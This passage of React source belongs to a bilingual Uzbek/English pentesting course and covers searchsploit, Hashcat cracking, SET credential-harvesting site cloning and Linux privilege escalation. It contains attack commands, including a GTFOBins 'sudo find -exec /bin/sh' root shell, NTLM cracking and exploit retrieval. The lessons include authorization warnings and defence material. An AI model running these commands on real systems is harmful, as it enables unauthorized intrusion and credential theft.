    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"LHOST — sizning (hujumchi) IP, LPORT — tinglayotgan port. Bunday yuklarni faqat o'zingizga tegishli laboratoriya yoki yozma ruxsat berilgan nishonlarda sinang.","LHOST is your (attacker) IP, LPORT the listening port. Only test such payloads in your own lab or on written-authorized targets.")),
    React.createElement(Quiz,{q:{uz:"msfvenom da LHOST nimani bildiradi?",en:"In msfvenom, what does LHOST specify?"},opts:[{uz:"Nishonning IP si",en:"The target's IP"},{uz:"Hujumchining (tinglovchining) IP si",en:"The attacker's (listener's) IP"},{uz:"Fayl nomi",en:"A file name"},{uz:"Payload turi",en:"The payload type"}],correct:1,exp:{uz:"LHOST — teskari ulanish qaytadigan manzil, ya'ni hujumchining o'z IP si. Nishon yuk ishga tushganda shu manzilga ulanadi.",en:"LHOST is where the reverse connection returns — the attacker's own IP. The target connects to it when the payload runs."}}));
}
function LessonL23(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"searchsploit va Exploit-DB","searchsploit and Exploit-DB")),
    React.createElement(P,null,t(lang,"Exploit-DB — dunyodagi eng katta ochiq ekspluatatsiya arxivi: unda minglab ma'lum zaifliklar uchun tayyor ekspluatatsiya kodi saqlanadi. searchsploit esa uning to'liq nusxasini Kali'da OFLAYN qidirish imkonini beradigan buyruq qatori vositasi. Nishon dasturi va uning aniq versiyasini bilganingizdan so'ng (masalan Nmap yoki WhatWeb yordamida), unga tegishli tayyor ekspluatatsiyani shu yerdan topasiz.","Exploit-DB is the world's largest public archive of exploits: it stores ready exploit code for thousands of known vulnerabilities. searchsploit is the command-line tool that lets you search a full local copy of it OFFLINE in Kali. Once you know the target software and its exact version (e.g. via Nmap or WhatWeb), you find a matching ready-made exploit here.")),
    React.createElement(H2,{num:"§2"},t(lang,"Topish oqimi","The find flow")),
    React.createElement(FlowSteps,{title:{uz:"Ekspluatatsiyani topish",en:"Finding an exploit"},steps:[
      {icon:"🔎",text:{uz:"searchsploit apache 2.4 — nom+versiya bo'yicha qidirish",en:"searchsploit apache 2.4 — search by name+version"}},
      {icon:"👁",text:{uz:"searchsploit -x ... — kodni o'qish",en:"searchsploit -x ... — read the code"}},
      {icon:"📋",text:{uz:"searchsploit -m ... — joriy katalogga nusxalash",en:"searchsploit -m ... — copy to the current folder"}},
      {icon:"🔧",text:{uz:"Kodni sozlab, ehtiyotkorlik bilan ishga tushirish",en:"Tune the code and run it carefully"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Qidiruv maslahatlari","Search tips")),
    React.createElement(P,null,t(lang,"Yaxshi qidiruv — muvaffaqiyat kaliti. Umumiy so'zlardan boshlang (searchsploit wordpress), keyin toraytiring (searchsploit wordpress 5.2 plugin). -t bilan faqat sarlavhada qidirasiz (aniqroq natija). Katta versiya raqamlarini olib tashlab ko'ring — ba'zan 2.4.49 topilmasa, 2.4 topiladi. Natijadagi \"Path\" ustuni ekspluatatsiya kodi joyini, chap taraf esa tavsifni ko'rsatadi.","A good search is the key to success. Start with general words (searchsploit wordpress), then narrow (searchsploit wordpress 5.2 plugin). With -t you search only the title (more precise). Try dropping minor version numbers — sometimes 2.4.49 isn't found but 2.4 is. In the results, the \"Path\" column shows the exploit code location, and the left side the description.")),
    React.createElement(H2,{num:"§4"},t(lang,"Ko'rish, nusxalash va oflayn qiymati","Viewing, copying and offline value")),
    React.createElement(P,null,t(lang,"-x bayrog'i ekspluatatsiya kodini to'g'ridan-to'g'ri terminalda ochadi (nima qilishini o'qish uchun). -m esa uni joriy katalogga nusxalaydi, keyin sozlab ishga tushirasiz. searchsploit'ning eng katta afzalligi — u OFLAYN ishlaydi: butun Exploit-DB sizning Kali'ingizda mahalliy saqlanadi, shuning uchun internetsiz muhitda ham (masalan izolyatsiya qilingan nishon tarmog'ida) ishlatasiz. searchsploit -u bilan uni yangilab turing.","The -x flag opens the exploit code directly in the terminal (to read what it does). -m copies it to the current directory, then you tune and run it. searchsploit's biggest advantage is that it works OFFLINE: the whole Exploit-DB is stored locally in your Kali, so you can use it even without internet (e.g. inside an isolated target network). Keep it updated with searchsploit -u.")),
    React.createElement(Terminal,null,"searchsploit apache 2.4\nsearchsploit -t wordpress\nsearchsploit -x php/webapps/50123.php   # kodni o'qish\nsearchsploit -m 50123                    # nusxalash\nsearchsploit -u                          # bazani yangilash"),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Internetdan olingan ekspluatatsiya kodini ko'r-ko'rona ishga tushirmang — avval uni o'qib, nima qilishini tushuning. Ba'zi «ekspluatatsiyalar» aslida sizning mashinangizga qarshi zararli kod bo'lishi mumkin.","Never blindly run exploit code from the internet — read it first and understand what it does. Some «exploits» are actually malicious code aimed at your own machine.")),
    React.createElement(H2,{num:"§5"},t(lang,"Interaktiv simulyator: ko'r-ko'rona ishga tushirish vs avval o'qish","Interactive simulator: running blindly vs reading first")),
    React.createElement(P,null,t(lang,"InfoBox'dagi ogohlantirishni his qiling — bitta shubhali «exploit» faylini ikki xil yondashuv bilan sinang:","Feel the InfoBox warning for yourself — try one suspicious «exploit» file two different ways:")),
    React.createElement(ExploitVerifySim),
    React.createElement(H2,{num:"§6"},t(lang,"searchsploit parametrlari","searchsploit options")),
    React.createElement(LayerStack,{layers:[{n:"-t",name:t(lang,"-t","-t"),color:"#4dabf7",desc:{uz:"Faqat sarlavha bo'yicha qidiradi (aniqroq).",en:"Search by title only (more precise)."}},{n:"-m",name:t(lang,"-m","-m"),color:"#69db7c",desc:{uz:"Ekspluatatsiyani joriy papkaga nusxalaydi.",en:"Copies the exploit to the current folder."}},{n:"-x",name:t(lang,"-x","-x"),color:"#a855f7",desc:{uz:"Ekspluatatsiya kodini ko'rsatadi.",en:"Displays the exploit code."}},{n:"-p",name:t(lang,"-p","-p"),color:"#ffd43b",desc:{uz:"To'liq yo'l va URL beradi.",en:"Gives the full path and URL."}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: ekspluatatsiya qidirish","Practice: finding an exploit")),
    React.createElement(P,null,t(lang,"Nishon versiyasini aniqlagach (nmap -sV), searchsploit unga mos tayyor ekspluatatsiyani oflayn topadi. Har doim versiyani aniq ko'rsating.","After identifying the target version (nmap -sV), searchsploit finds a matching ready exploit offline. Always specify the version precisely.")),
    React.createElement(Terminal,null,"searchsploit apache 2.4.49\n# ------------------------------------- -------------\n#  Exploit Title                        |  Path\n# ------------------------------------- -------------\n#  Apache 2.4.49 - Path Traversal & RCE | multiple/webapps/50383.sh\nsearchsploit -m 50383   # nusxalab olish"),
    React.createElement(Quiz,{q:{uz:"searchsploit asosan nima uchun ishlatiladi?",en:"What is searchsploit mainly used for?"},opts:[{uz:"Portlarni skanerlash",en:"Scanning ports"},{uz:"Ma'lum dastur/versiyaga tayyor ekspluatatsiyalarni topish",en:"Finding ready exploits for a known software/version"},{uz:"Parollarni buzish",en:"Cracking passwords"},{uz:"Trafikni tinglash",en:"Sniffing traffic"}],correct:1,exp:{uz:"searchsploit Exploit-DB ning lokal nusxasidan ma'lum dastur va versiyaga mos ekspluatatsiyalarni OFLAYN qidiradi.",en:"searchsploit searches a local copy of Exploit-DB OFFLINE for exploits matching a known software and version."}}));
}
function LessonL26(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Hashcat nima?","What is Hashcat?")),
    React.createElement(P,null,t(lang,"Hashcat — dunyodagi eng tezkor parol hash buzuvchi vosita. Parollar hech qachon oddiy matn ko'rinishida saqlanmaydi; ular \"hash\" — bir tomonlama matematik funksiyaning natijasiga aylantiriladi. Hashcat teskari yo'l bilan (hashdan parolga qaytolmaydi, chunki bu mumkin emas) emas, balki taxminlarni tekshirish orqali ishlaydi: u millionlab so'zni oladi, har birini xuddi shu hash funksiyasi bilan hashlaydi va natijani buzilishi kerak bo'lgan hash bilan solishtiradi.","Hashcat is the world's fastest password-hash cracker. Passwords are never stored as plain text; they are turned into a \"hash\" — the output of a one-way mathematical function. Hashcat does not reverse the hash (that is impossible) but works by guessing: it takes millions of candidate words, hashes each one with the very same hash function, and compares the result to the hash it wants to crack.")),
    React.createElement(P,null,t(lang,"Hashcat John the Ripper kabi oflayn ishlaydi — ya'ni nishon tizimga ulanmaydi, faqat qo'lga kiritilgan hash fayl ustida ishlaydi. Farqi shundaki, Hashcat GPU (videokarta) quvvatidan foydalanadi. GPU minglab yadroga ega bo'lgani uchun sekundiga milliardlab taxminni parallel sinaydi, CPU esa faqat millionlab. Shu sabab katta va murakkab ishlar uchun Hashcat John'dan o'nlab marta tezroq.","Hashcat, like John the Ripper, works offline — it never connects to the target, only operates on a captured hash file. The difference is that Hashcat uses GPU (graphics card) power. Because a GPU has thousands of cores, it tries billions of guesses per second in parallel, while a CPU manages only millions. That makes Hashcat tens of times faster than John for large, complex jobs.")),
    React.createElement(H2,{num:"§2"},t(lang,"Hujum rejimlari (-a)","Attack modes (-a)")),
    React.createElement(P,null,t(lang,"Hashcat qanday taxminlar yaratishini -a bayrog'i belgilaydi. To'g'ri rejimni tanlash — muvaffaqiyatning yarmi. Lug'at (dictionary) hujumi tayyor parollar ro'yxatini sinaydi va deyarli har doim birinchi urinish bo'ladi, chunki odamlar oddiy parollarni takrorlaydi. Brute-force esa barcha kombinatsiyalarni sinaydi — kafolatli, lekin uzun parol uchun asrlar ketishi mumkin.","The -a flag decides how Hashcat generates guesses. Choosing the right mode is half the battle. A dictionary attack tries a ready list of passwords and is almost always the first try, because people reuse simple passwords. Brute-force tries every combination — guaranteed, but for a long password it can take centuries.")),
    React.createElement(LayerStack,{layers:[
      {n:"-a 0",name:t(lang,"Lug'at","Dictionary"),color:"#69db7c",desc:{uz:"Wordlist bilan (rockyou.txt) — eng tez va samarali birinchi qadam.",en:"With a wordlist (rockyou.txt) — the fastest, most effective first step."}},
      {n:"-a 3",name:t(lang,"Brute-force (maska)","Brute-force (mask)"),color:"#ff3a5e",desc:{uz:"?a?a?a... belgilar kombinatsiyasi — barcha variantlarni sinaydi.",en:"?a?a?a... character combinations — tries every variant."}},
      {n:"-a 6",name:t(lang,"Wordlist + maska","Wordlist + mask"),color:"#4dabf7",desc:{uz:"Lug'at so'ziga qo'shimchalar (password + ?d?d).",en:"Suffixes appended to wordlist words (password + ?d?d)."}},
      {n:"-a 1",name:t(lang,"Kombinator","Combinator"),color:"#a855f7",desc:{uz:"Ikki lug'at so'zini birlashtiradi (summer + 2024).",en:"Joins two wordlist words (summer + 2024)."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Interaktiv simulyator: CPU vs GPU tezligi","Interactive simulator: CPU vs GPU speed")),
    React.createElement(P,null,t(lang,"§1 dagi da'voni raqamlar bilan his qiling — xuddi shu 8 belgili brute-force vazifasini ikki uskunada sinang:","Feel the §1 claim in numbers — try the exact same 8-character brute-force job on two kinds of hardware:")),
    React.createElement(GPUSpeedSim),
    React.createElement(H2,{num:"§4"},t(lang,"Hash turini aniqlash (-m)","Identifying the hash type (-m)")),
    React.createElement(P,null,t(lang,"Hashcat qaysi hash algoritmini buzayotganini bilishi shart — buni -m raqami belgilaydi. Agar noto'g'ri -m tanlasangiz, Hashcat butunlay boshqa algoritm bilan hashlaydi va hech qachon topa olmaydi. Hash turini ko'rinishidan taxmin qilish mumkin: MD5 — 32 ta belgi, SHA-1 — 40, NTLM (Windows) — 32 lekin boshqacha, bcrypt esa $2a$ bilan boshlanadi. hashid yoki hash-identifier vositalari buni avtomatik aniqlaydi.","Hashcat must know which hash algorithm it is cracking — the -m number sets this. Pick the wrong -m and Hashcat hashes with a completely different algorithm and never finds a match. You can often guess the type from its shape: MD5 is 32 characters, SHA-1 is 40, NTLM (Windows) is 32 but different, and bcrypt starts with $2a$. The hashid or hash-identifier tools detect this automatically.")),
    React.createElement(Terminal,null,"# Avval hash turini aniqlash\nhashid '5f4dcc3b5aa765d61d8327deb882cf99'\n\n# MD5 lug'at hujumi\nhashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Windows NTLM hash\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt\n\n# Maska: 8 ta kichik harf\nhashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l\n\n# Buzilgan parollarni ko'rish\nhashcat -m 0 hashes.txt --show"),
    React.createElement(H2,{num:"§5"},t(lang,"Maskalar va qoidalar","Masks and rules")),
    React.createElement(P,null,t(lang,"Maskada har belgi turini simvol bildiradi: ?l — kichik harf, ?u — katta harf, ?d — raqam, ?s — maxsus belgi, ?a — hammasi. Masalan ?u?l?l?l?l?d?d?d?d paroli \"Admin2024\" kabi shakllarni sinaydi. Qoidalar (rules, -r) esa lug'at so'zlarini aqlli o'zgartiradi — masalan best64.rule \"password\" so'zidan \"Password1\", \"p@ssw0rd\", \"PASSWORD!\" kabi yuzlab variant yaratadi. Bu haqiqiy odamlarning parol yasash odatlarini taqlid qiladi va samaradorlikni keskin oshiradi.","In a mask each character type has a symbol: ?l is lowercase, ?u uppercase, ?d a digit, ?s a special char, ?a everything. For example ?u?l?l?l?l?d?d?d?d tries shapes like \"Admin2024\". Rules (-r) transform wordlist words intelligently — best64.rule turns \"password\" into hundreds of variants like \"Password1\", \"p@ssw0rd\", \"PASSWORD!\". This mimics how real people build passwords and sharply raises the hit rate.")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Buzilgan parollar potfile'ga (~/.hashcat/hashcat.potfile) saqlanadi, shuning uchun --show keyingi safar tez ishlaydi. Katta ishlar uchun rockyou.txt + best64.rule kombinatsiyasi eng yaxshi boshlang'ich nuqta.","Cracked passwords are stored in the potfile (~/.hashcat/hashcat.potfile), so --show is instant next time. For big jobs, rockyou.txt + best64.rule is the best starting combination.")),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Hash buzishni faqat o'zingizga tegishli yoki yozma ruxsat berilgan hashlar ustida bajaring. Boshqa birovning parolini ruxsatsiz buzish jinoyat.","Only crack hashes you own or are given written authorization for. Cracking someone else's password without permission is a crime.")),
    React.createElement(H2,{num:"§6"},t(lang,"Hashcat buzish oqimi","The Hashcat cracking flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"GPU bilan buzish",en:"Cracking with the GPU"},steps:[{icon:"🔎",text:{uz:"hashid — hash turini aniqlash (-m raqami)",en:"hashid — identify the hash type (-m number)"}},{icon:"📖",text:{uz:"Lug'at + qoida tanlash (rockyou + best64)",en:"Pick a wordlist + rule (rockyou + best64)"}},{icon:"⚡",text:{uz:"GPU sekundiga milliardlab taxminni sinaydi",en:"The GPU tries billions of guesses per second"}},{icon:"✅",text:{uz:"--show — topilgan parolni ko'rsatadi",en:"--show — reveals the found password"}},]}),
    React.createElement(H2,{num:"§7"},t(lang,"Amaliyot: NTLM hashni buzish","Practice: cracking an NTLM hash")),
    React.createElement(P,null,t(lang,"Hashcat GPU quvvatidan foydalanib John'dan o'nlab marta tezroq ishlaydi. -m hash turini, -a hujum rejimini belgilaydi.","Hashcat uses GPU power to run tens of times faster than John. -m sets the hash type, -a the attack mode.")),
    React.createElement(Terminal,null,"hashcat -m 1000 -a 0 ntlm.txt rockyou.txt\n# Session..........: hashcat   Status.....: Cracked\n# 8846f7eaee8fb117ad06bdd830b7586c:Password1\n# Speed.#1...: 12345.6 MH/s"),
    React.createElement(Quiz,{q:{uz:"Hashcat ning John dan asosiy farqi nimada?",en:"Hashcat's main difference from John?"},opts:[{uz:"U onlayn ishlaydi",en:"It works online"},{uz:"U GPU'dan foydalanib ancha tezroq",en:"It uses the GPU and is much faster"},{uz:"U faqat MD5 buzadi",en:"It only cracks MD5"},{uz:"U parol yaratadi",en:"It creates passwords"}],correct:1,exp:{uz:"Hashcat GPU'dan foydalanib sekundiga milliardlab parolni sinaydi — katta ishlar uchun John'dan tezroq. Ikkalasi ham oflayn ishlaydi.",en:"Hashcat leverages the GPU for billions of tries per second — faster than John for big jobs. Both work offline."}}));
}
function LessonL28(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Ijtimoiy muhandislik va SET","Social engineering and SET")),
    React.createElement(P,null,t(lang,"Ijtimoiy muhandislik — texnik zaifliklardan emas, insonlarni aldash orqali amalga oshiriladigan hujum. Har qanday tizimning eng zaif bo'g'ini — bu odam. Firewall, antivirus va shifrlash qanchalik kuchli bo'lmasin, bitta ishonuvchan xodim soxta emailga parolini kiritsa, barcha himoya behuda bo'ladi. Ko'plab yirik buzilishlar aynan phishing emaildan boshlangan.","Social engineering attacks by deceiving people rather than exploiting technical flaws. The weakest link in any system is the human. No matter how strong the firewall, antivirus and encryption are, if one trusting employee enters their password into a fake email, all the defenses are wasted. Many major breaches began with a single phishing email.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy turlari","Main types")),
    React.createElement(LayerStack,{layers:[
      {n:"🎣",name:t(lang,"Phishing","Phishing"),color:"#ff3a5e",desc:{uz:"Soxta email/sahifa orqali login yoki ma'lumot o'g'irlash.",en:"Stealing credentials or data via fake emails/pages."}},
      {n:"🎭",name:t(lang,"Pretexting","Pretexting"),color:"#a855f7",desc:{uz:"Yolg'on rol o'ynash (IT xodimi, bank) — ishonch qozonish.",en:"Playing a false role (IT staff, bank) to gain trust."}},
      {n:"🪤",name:t(lang,"Baiting","Baiting"),color:"#4dabf7",desc:{uz:"\"Bepul\" USB yoki fayl orqali qurbonni aldash.",en:"Luring the victim with a \"free\" USB or file."}},
      {n:"📞",name:t(lang,"Vishing","Vishing"),color:"#69db7c",desc:{uz:"Telefon qo'ng'irog'i orqali ma'lumot undirish.",en:"Extracting info over a phone call."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Phishing oqimi (misol)","Phishing flow (example)")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Credential harvesting",en:"Credential harvesting"},steps:[
      {icon:"🎭",text:{uz:"Haqiqiy login sahifasining soxta nusxasi klonlanadi",en:"A fake clone of a real login page is created"}},
      {icon:"📧",text:{uz:"Qurbonga ishonchli ko'rinuvchi havola yuboriladi",en:"A believable link is sent to the victim"}},
      {icon:"⌨",text:{uz:"Qurbon login/parolni soxta sahifaga kiritadi",en:"The victim enters credentials on the fake page"}},
      {icon:"🕳",text:{uz:"Ma'lumot hujumchiga yuboriladi (harvest)",en:"The data is sent to the attacker (harvested)"}},
    ]}),
    React.createElement(H2,{num:"§4"},t(lang,"SET (Social-Engineer Toolkit)","SET (Social-Engineer Toolkit)")),
    React.createElement(P,null,t(lang,"SET — Kali'da oldindan o'rnatilgan, ijtimoiy muhandislik stsenariylarini yaratuvchi vosita. U menyu asosida ishlaydi: siz hujum turini tanlaysiz (masalan, veb-sayt hujumi), so'ng metodni (Credential Harvester — login o'g'irlash). SET haqiqiy sayt (masalan, korporativ pochta login sahifasi) nusxasini avtomatik klonlaydi va qurbon kiritgan har qanday ma'lumotni yozib boradi. Bu pentestda \"insoniy omil\" qanchalik zaif ekanini xavfsiz, nazorat ostida ko'rsatish uchun ishlatiladi.","SET is a pre-installed Kali tool that builds social-engineering scenarios. It is menu-driven: you pick an attack type (e.g. website attack), then a method (Credential Harvester — steal logins). SET automatically clones a copy of a real site (say, a corporate mail login page) and records anything the victim types. It is used in pentests to demonstrate — safely and under control — just how weak the \"human factor\" is.")),
    React.createElement(Terminal,null,"sudo setoolkit\n# 1) Social-Engineering Attacks\n#   2) Website Attack Vectors\n#     3) Credential Harvester Attack Method\n#       2) Site Cloner\n# Klonlash uchun URL kiriting va IP ni ko'rsating"),
    React.createElement(H2,{num:"§5"},t(lang,"Himoya","Defense")),
    React.createElement(P,null,t(lang,"Ijtimoiy muhandislikka qarshi eng yaxshi himoya — texnik emas, balki ta'lim. Xodimlarni muntazam o'qitish, shubhali emaillarni tekshirish odati, havola ustiga bosishdan oldin manzilni ko'rish, va eng muhimi — ko'p faktorli autentifikatsiya (MFA). MFA yoqilgan bo'lsa, hujumchi parolni o'g'irlasa ham ikkinchi omilsiz (telefon kodi) kira olmaydi. Har qanday shoshilinch \"hoziroq parolingizni tasdiqlang\" so'rovi — ogohlantirish belgisi.","The best defense against social engineering is not technical but education. Regular staff training, a habit of scrutinizing suspicious emails, checking a link's address before clicking, and most importantly multi-factor authentication (MFA). With MFA on, even if the attacker steals the password they cannot log in without the second factor (a phone code). Any urgent \"confirm your password right now\" request is a warning sign.")),
    React.createElement(H2,{num:"§6"},t(lang,"Interaktiv simulyator: MFA'siz vs MFA bilan","Interactive simulator: without MFA vs with MFA")),
    React.createElement(P,null,t(lang,"§5 dagi eng muhim himoyani his qiling — bir xil o'g'irlangan parol ikki holatda qanday farqli tugashini ko'ring:","Feel the most important defense from §5 for yourself — see how the same stolen password ends very differently in two situations:")),
    React.createElement(MFADefenseSim),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Ijtimoiy muhandislik hujumlari faqat rasmiy, yozma ruxsat berilgan pentest doirasida o'tkazilishi mumkin. Aks holda bu firibgarlik va jinoyat.","Social engineering attacks may only be run within a formal, written-authorized pentest. Otherwise it is fraud and a crime.")),
    React.createElement(H2,{num:"§7"},t(lang,"Himoya qatlamlari","Layers of defense")),
    React.createElement(LayerStack,{layers:[{n:"🎓",name:t(lang,"Ta'lim","Training"),color:"#69db7c",desc:{uz:"Xodimlarni muntazam o'qitish — eng samarali himoya.",en:"Regular staff training — the most effective defense."}},{n:"🔐",name:t(lang,"MFA","MFA"),color:"#4dabf7",desc:{uz:"Parol o'g'irlansa ham ikkinchi omil to'sadi.",en:"Even if the password is stolen, the second factor blocks entry."}},{n:"🔗",name:t(lang,"Havolani tekshirish","Check links"),color:"#ffd43b",desc:{uz:"Bosishdan oldin manzilni ko'rish.",en:"Inspect the address before clicking."}},{n:"🚨",name:t(lang,"Shoshilinch so'rov","Urgent request"),color:"#ff3a5e",desc:{uz:"«Hoziroq tasdiqlang» — ogohlantirish belgisi.",en:"«Confirm right now» — a warning sign."}},]}),
    React.createElement(H2,{num:"§8"},t(lang,"Amaliyot: SET menyusi","Practice: the SET menu")),
    React.createElement(P,null,t(lang,"SET menyu asosida ishlaydi: hujum turini va metodni tanlaysiz, u soxta sahifani avtomatik klonlaydi. Bu faqat ruxsat berilgan pentestda, insoniy omilni ko'rsatish uchun.","SET is menu-driven: you pick an attack type and method, and it auto-clones a fake page. This is only for authorized pentests, to demonstrate the human factor.")),
    React.createElement(Terminal,null,"sudo setoolkit\n#  1) Social-Engineering Attacks\n#    2) Website Attack Vectors\n#      3) Credential Harvester Attack Method\n#        2) Site Cloner"),
    React.createElement(Quiz,{q:{uz:"Ijtimoiy muhandislik nimaga asoslanadi?",en:"What does social engineering rely on?"},opts:[{uz:"Dasturiy zaifliklarga",en:"Software vulnerabilities"},{uz:"Insonlarni aldash va ishonchdan foydalanishga",en:"Deceiving people and abusing trust"},{uz:"Tarmoq portlariga",en:"Network ports"},{uz:"Shifrlash xatolariga",en:"Encryption flaws"}],correct:1,exp:{uz:"Ijtimoiy muhandislik insoniy omilga qaratilgan — odamlarni aldab maxfiy ma'lumot yoki kirish berishga undaydi.",en:"Social engineering targets the human factor — tricking people into handing over secrets or access."}}));
}
function LessonL29(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Imtiyozlarni oshirish nima?","What is privilege escalation?")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish (privilege escalation, qisqacha privesc) — tizimga oddiy, cheklangan foydalanuvchi sifatida kirgach, root (Linux) yoki Administrator (Windows) huquqlarini qo'lga kiritish jarayoni. Deyarli har bir haqiqiy hujum past imtiyozli kirish nuqtasidan boshlanadi — masalan, oddiy veb-server foydalanuvchisi. Bu darajada siz ko'p narsa qila olmaysiz. Privesc esa to'liq nazorat beradi: barcha fayllarni o'qish, parollarni olish, boshqa tizimlarga tarqalish.","Privilege escalation (privesc for short) is the process of gaining root (Linux) or Administrator (Windows) rights after entering a system as an ordinary, limited user. Almost every real attack starts from a low-privilege foothold — for example a plain web-server user. At that level you can do little. Privesc gives full control: reading all files, harvesting passwords, spreading to other systems.")),
    React.createElement(P,null,t(lang,"Privescning ikki turi bor. Vertical (vertikal) — past huquqdan yuqoriga (foydalanuvchi → root). Horizontal (gorizontal) — bir xil darajadagi boshqa foydalanuvchiga o'tish (bir oddiy foydalanuvchidan boshqasiga, masalan uning fayllariga kirish uchun). Ko'pincha maqsad vertikal privesc, chunki root/Administrator butun tizimni egallash demakdir.","There are two kinds of privesc. Vertical — from a lower right up to a higher one (user → root). Horizontal — moving to another user at the same level (from one normal user to another, e.g. to reach their files). The usual goal is vertical privesc, because root/Administrator means owning the entire machine.")),
    React.createElement(H2,{num:"§2"},t(lang,"Linux privesc tekshiruvi","Linux privesc checks")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Privesc yo'lini izlash",en:"Hunting a privesc path"},steps:[
      {icon:"🔑",text:{uz:"sudo -l — qanday sudo huquqim bor?",en:"sudo -l — what sudo rights do I have?"}},
      {icon:"🎫",text:{uz:"SUID fayllarni topish (GTFOBins bilan solishtirish)",en:"Find SUID files (compare with GTFOBins)"}},
      {icon:"⏱",text:{uz:"Yozish mumkin cron ishlari va kernel versiyasi",en:"Writable cron jobs and the kernel version"}},
      {icon:"🤖",text:{uz:"LinPEAS bilan avtomatik tekshirish",en:"Automate the checks with LinPEAS"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Keng tarqalgan vektorlar","Common vectors")),
    React.createElement(P,null,t(lang,"Privesc yo'llari odatda noto'g'ri sozlangan tizimning natijasidir. Eng ko'p uchraydiganlari: (1) sudo huquqlari — agar biror dasturni parolsiz sudo bilan ishga tushira olsangiz, ko'pincha uni root shell'ga aylantirish mumkin. (2) SUID bitlari — root egasi bo'lgan va SUID o'rnatilgan dastur har doim root huquqi bilan ishlaydi; vim, find, nmap kabi dasturlar bunda xavfli. (3) Yozish mumkin cron ishlari — agar root ishga tushiradigan skriptni tahrirlashingiz mumkin bo'lsa, unga o'z kodingizni qo'shasiz. (4) Kernel ekspluatatsiyalari — eski kernel versiyasida ma'lum zaiflik bo'lsa.","Privesc paths usually stem from a misconfigured system. The most common: (1) sudo rights — if you can run some program with sudo without a password, you can often turn it into a root shell. (2) SUID bits — a program owned by root with SUID set always runs with root privileges; tools like vim, find, nmap are dangerous here. (3) Writable cron jobs — if you can edit a script that root runs, you inject your own code into it. (4) Kernel exploits — when an old kernel version has a known vulnerability.")),
    React.createElement(Terminal,null,"# Qo'lda tez tekshiruv\nsudo -l                              # parolsiz sudo huquqlari\nfind / -perm -4000 -type f 2>/dev/null   # SUID fayllar\nuname -a                             # kernel versiyasi\ncat /etc/crontab                     # rejalashtirilgan ishlar\ngetcap -r / 2>/dev/null               # capabilitylar\n\n# Avtomatik (barcha tekshiruvlar birdan)\n./linpeas.sh"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"GTFOBins (gtfobins.github.io) — SUID/sudo huquqli oddiy dasturlarni (vim, find, less) qanday qilib root olishga aylantirishni ko'rsatadi. Windows uchun ekvivalenti — LOLBAS. LinPEAS/WinPEAS esa barcha tekshiruvlarni avtomatlashtiradi va topilmalarni rang bilan belgilaydi.","GTFOBins (gtfobins.github.io) shows how ordinary programs (vim, find, less) with SUID/sudo can be turned into root. The Windows equivalent is LOLBAS. LinPEAS/WinPEAS automate all the checks and color-highlight the findings.")),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Privesc texnikalarini faqat o'z laboratoriyangizda yoki yozma ruxsat berilgan pentestda sinang.","Only test privesc techniques in your own lab or a written-authorized pentest.")),
    React.createElement(H2,{num:"§4"},t(lang,"Interaktiv simulyator: yoziladigan cron skripti","Interactive simulator: a writable cron script")),
    React.createElement(P,null,t(lang,"§3 dagi 3-vektorni amalda ko'ring — root ishga tushiradigan bir xil skriptni ikki ruxsat sozlamasida sinang:","See §3's third vector in action — try the exact same root-run script under two different permission settings:")),
    React.createElement(CronPrivescSim),
    React.createElement(H2,{num:"§5"},t(lang,"Asosiy privesc vektorlari","The main privesc vectors")),
    React.createElement(LayerStack,{layers:[{n:"sudo",name:t(lang,"sudo -l","sudo -l"),color:"#ff3a5e",desc:{uz:"Parolsiz sudo → ko'pincha root shell.",en:"Passwordless sudo → often a root shell."}},{n:"SUID",name:t(lang,"SUID","SUID"),color:"#f7b955",desc:{uz:"find -perm -4000 → GTFOBins.",en:"find -perm -4000 → GTFOBins."}},{n:"cron",name:t(lang,"cron","cron"),color:"#4dabf7",desc:{uz:"Yoziladigan root skripti → reverse shell.",en:"A writable root script → reverse shell."}},{n:"kernel",name:t(lang,"kernel","kernel"),color:"#a855f7",desc:{uz:"Eski yadro → ma'lum exploit.",en:"Old kernel → a known exploit."}},]}),
    React.createElement(H2,{num:"§6"},t(lang,"Amaliyot: birinchi tekshiruvlar","Practice: the first checks")),
    React.createElement(P,null,t(lang,"Kirgach, tez tekshiruvlardan boshlang: sudo -l, SUID fayllar va yadro versiyasi. Bular ko'pincha eng tez root yo'lini ochadi. To'liq bo'lim — 4-bo'limda.","After landing, start with the quick checks: sudo -l, SUID files and the kernel version. These often open the fastest path to root. The full section is in Section 4.")),
    React.createElement(Terminal,null,"sudo -l\n# User www-data may run the following commands:\n#   (root) NOPASSWD: /usr/bin/find\n# → GTFOBins: sudo find . -exec /bin/sh \\; -quit → root!\nuname -r ; find / -perm -4000 2>/dev/null"),
